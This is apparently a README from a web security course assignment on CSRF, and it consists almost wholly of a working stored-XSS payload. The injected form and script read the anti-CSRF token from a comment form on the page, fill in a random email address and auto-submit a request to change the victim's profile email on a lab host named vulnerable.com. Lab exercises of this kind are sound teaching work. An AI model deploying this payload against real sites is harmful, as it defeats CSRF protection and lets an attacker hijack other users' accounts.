# WebSecurity-CSRF
Web Security Assignment on CSRF


# Script that will exploit the stored XSS vulnerability and trigger a CSRF

<form id="fake_form" action="http://www.vulnerable.com:5000/profile/update-email" method="POST"> 
  <input id="my_mail"  name="email" value=""> 
  <input id="my_csrf" name="csrf" value=""> 
</form> 

<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    document.getElementById("my_mail").value = rndMail();
    document.getElementById("my_csrf").value = stolen_csrf;
    document.getElementById("fake_form").submit(); 
}
</script>
